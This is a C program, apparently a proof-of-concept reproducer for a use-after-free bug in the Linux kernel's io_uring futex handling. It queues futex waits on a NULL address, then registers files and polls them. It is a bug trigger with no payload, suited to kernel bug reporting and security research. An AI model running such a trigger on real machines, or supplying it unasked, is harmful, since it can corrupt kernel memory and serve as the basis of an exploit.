/*
 * compile with gcc uaf.c -o uaf -luring 
 */
#include <liburing.h>
#include <stdio.h>
#include <stdlib.h>
#include <linux/futex.h>
#include <linux/poll.h>
#include <unistd.h>


int main(int argc, char *argv[])
{
	struct io_uring_sqe *sqe;
	struct io_uring_cqe *cqe;
	struct io_uring ring;
	unsigned int *futex = NULL;
	int pipe1[2];
	int ret, i;

	pipe1[0] = open("myfifo", O_RDWR);
	pipe1[1] = open("fifo", O_RDWR);

	ret = io_uring_queue_init(64, &ring, 0);

	if (ret) 
		return ret;

	sqe = io_uring_get_sqe(&ring);

	io_uring_prep_futex_wait(sqe, futex, 0, FUTEX_BITSET_MATCH_ANY, FUTEX2_SIZE_U32, 0);
	sqe->user_data = 1;

	sqe = io_uring_get_sqe(&ring);

	io_uring_prep_futex_wait(sqe, futex, 0, FUTEX_BITSET_MATCH_ANY, FUTEX2_SIZE_U32, 0);
	sqe->user_data = 2;

	io_uring_submit(&ring);

	for (i = 0; i < 2; i++) {

		ret = io_uring_wait_cqe(&ring, &cqe);

		if (ret) {
			fprintf(stderr, "wait %d \n", ret);
			return 1;
		}

		if (cqe->res < 0) { 
			fprintf(stderr, "cqe error %d \n", cqe->res);
		}

		io_uring_cqe_seen(&ring, cqe);
	}

	ret = io_uring_peek_cqe(&ring, &cqe);

	if (!ret) {
		fprintf(stderr, "peek found cqe! \n");
		return 1;
	}

	ret = io_uring_register_files(&ring, pipe1, 2);

	if (ret < 0) {
		fprintf(stderr, "io_uring register files failed \n");
		return 1;
	}

	for (i = 0; i < 2; i++ ) {

		sqe = io_uring_get_sqe(&ring);
		io_uring_prep_poll_add(sqe, i, 0);
		sqe->flags |= IOSQE_FIXED_FILE;
		sqe->user_data = i;

	}

	ret = io_uring_submit_and_wait(&ring, 2);

	if (ret != 2) {
		fprintf(stderr, "submit failed \n");
		return 1;
	}

	for (i = 0; i < 2; i++) {

		ret = io_uring_wait_cqe(&ring, &cqe);

		if (ret) {
			fprintf(stderr, "wait %d \n", ret);
			return 1;
		}

		if (cqe->res < 0) { 
			fprintf(stderr, "cqe error %d \n", cqe->res);
		}

		io_uring_cqe_seen(&ring, cqe);
	}

	ret = io_uring_peek_cqe(&ring, &cqe);

	if (!ret) {
		fprintf(stderr, "peek found cqe! \n");
		return 1;
	}

	io_uring_queue_exit(&ring);

	free(futex);
	return 0;
}





